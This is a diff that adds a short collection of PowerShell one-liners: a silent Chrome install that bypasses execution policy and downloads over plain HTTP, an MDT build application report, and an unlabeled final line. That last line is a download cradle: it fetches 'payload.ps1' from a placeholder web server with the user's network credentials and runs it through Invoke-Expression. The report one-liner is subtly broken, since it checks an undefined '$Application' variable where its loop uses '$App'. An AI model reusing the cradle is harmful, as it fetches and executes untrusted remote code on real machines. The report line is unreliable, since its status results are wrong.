@@ -1,0 +1,7 @@
+#Google Chrome Installation One-Liner
+
+powershell.exe -executionpolicy bypass -command "&{$URI='http://dl.google.com/chrome/install/375.126/chrome_installer.exe';$ChromeInstaller=$env:TEMP+'ChromeInstaller.exe';Invoke-WebRequest -Uri $URI -OutFile $ChromeInstaller -ErrorAction SilentlyContinue;$ErrCode=(Start-Process -FilePath $ChromeInstaller -ArgumentList '/silent /install' -Wait -Passthru).ExitCode;Remove-Item $ChromeInstaller -ErrorAction SilentlyContinue -Force;Exit $ErrCode}"  
+#MDT Build Application Report One-Liner
+powershell.exe -executionpolicy bypass -command "&{$Apps=@();$ZTIAppsLog=Get-Content -Path ($env:SystemDrive+'\MININT\SMSOSD\OSDLOGS\ZTIApplications.log');$AppNames=($ZTIAppsLog|Where-Object {$_ -like '*Name:*'})|ForEach-Object {(($_.split('[')[2]).split(':')[1]).split(']')[0].Trim()};Foreach ($App in $AppNames) {$obj=New-Object -TypeName PSObject;If (($ZTIAppsLog|Where-Object {$_ -like ('*Application'+[char]32+$Application+'*')}|ForEach-Object {($_.split('[')[2]).split(']')[0]}|ForEach-Object {$_ -replace 'Application ',''}) -like '*installed successfully*') {$Status='Installed'} else {$Status='Failed'};$obj|Add-Member -MemberType NoteProperty -Name Application -Value $App;$obj|Add-Member -MemberType NoteProperty -Name Status -Value $Status;$Apps+=$obj};$Apps|Out-GridView -PassThru}"  
+
+powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"
